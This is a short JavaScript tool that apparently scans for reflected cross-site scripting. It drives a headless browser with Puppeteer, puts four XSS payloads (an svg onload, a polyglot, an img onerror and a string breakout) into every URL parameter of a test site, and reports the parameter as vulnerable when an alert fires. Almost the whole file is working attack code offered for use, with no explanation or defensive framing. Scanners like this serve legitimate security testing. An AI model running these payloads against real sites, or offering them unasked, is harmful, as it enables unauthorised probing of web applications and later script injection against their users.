//Dependency
const Puppeteer = require("puppeteer")
var final_payload= "";

//URL To test the XSS
const URL = "http://testphp.vulnweb.com/listproducts.php?cat=x&bat=x"

// List of Payloads. Some common xss payload and some polygot payloads.
const Payloads=['\'"><svg/onload=alert(1)>',
                "jaVasCript:\/*-\/*`\/*\\`\/*'\/*\"\/**\/(\/* *\/oNcliCk=alert() )\/\/%0D%0A%0d%0a\/\/<\/stYle\/<\/titLe\/<\/teXtarEa\/<\/scRipt\/--!>\\x3csVg\/<sVg\/oNloAd=alert(1)\/\/>\\x3e",
                '\'"><img src=x onerror=alert`1`>',
                        "')%3Balert(1)%3Bvar b=('"
                      ]
//Main Function
Main()
async function Main(){
    var vulnerable = false
    const browser = await Puppeteer.launch({ headless: true, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
    const page = await browser.newPage()
    
    page.on("dialog", dialog =>{
        vulnerable = true
        dialog.accept()
    })

    // Replacing the values of different parameter with the xss payload
    for( j in Payloads)
    {


        let final_url = build_url(URL,Payloads[j])
        await page.goto(final_url)
        //Check if vulnerable. If yes then exit the loop.
        if(vulnerable){
            console.log("It's vulnerable to XSS.")
            console.log("Vulnerable URL: ",final_url, "\nPayload: ", Payloads[j])
            break;
        }
        
    }
    if(!vulnerable){
        console.log("It's not vulnerable to XSS.")
    }

    browser.close()
    
}

//This function takes input the original url and xss payload and return the url by replacing the original parameter values with xss payloads.
const build_url= (url,script)=> {
    final_payload = ""
    split = url.split('?');
    parameter = split[1].split('&');
    //Replacing values of all parameters with the payload.
    for(i in parameter)
    {
        para = parameter[i].split('=');
        para[0] = para[0] +"="+script+"&";
        final_payload = final_payload + para[0]; 
    }
    url = split[0]+"?"+final_payload;
    return url
}